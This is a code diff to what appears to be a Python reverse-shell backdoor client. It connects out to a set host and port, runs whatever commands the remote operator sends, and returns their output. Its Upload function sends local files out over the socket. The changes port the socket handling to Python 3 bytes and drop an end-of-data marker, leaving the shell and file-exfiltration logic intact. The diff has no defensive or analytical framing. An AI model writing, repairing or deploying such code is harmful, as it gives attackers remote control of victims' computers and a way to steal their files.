@@ -21,8 +21,8 @@ def Upload(sock, file):
     f = open(file, 'rb')
   except IOError:
     return 'Error opening file'
-  d = f.read().decode('utf-8')
-  Send(sock, d + 'FILENAMEXXX%sFILEXXXEODXXX' % file)
+  d = f.read()
+  Send(sock, d + b'FILENAMEXXX%sFILEXXX' % file.encode())
   f.close()
   return 'File sent 🍺'
 
@@ -93,18 +93,18 @@ while True:
     sock = socket.socket(AF_INET, SOCK_STREAM)
     sock.connect((HOST, PORT))
 
-    data = Receive(sock)
+    data = Receive(sock).decode()
 
     if data == 'activate':
       active = True
-      Send(sock, os.getcwd() + '>EODXXX')
+      Send(sock, os.getcwd() + '>')
 
     while active:
       ret = ''
-      data = Receive(sock)
+      data = Receive(sock).decode()
 
       if data == 'exit':
-        Send(sock, 'exit okEODXXX')
+        Send(sock, 'exit ok')
         break
         # TODO
 
@@ -135,7 +135,7 @@ while True:
       else:
         ret = run(data)
 
-      ret = ret + '\n' + os.getcwd() + '>EODXXX'
+      ret = ret + '\n' + os.getcwd() + '>'
       Send(sock, ret)
   except socket.error:
     sock.close()
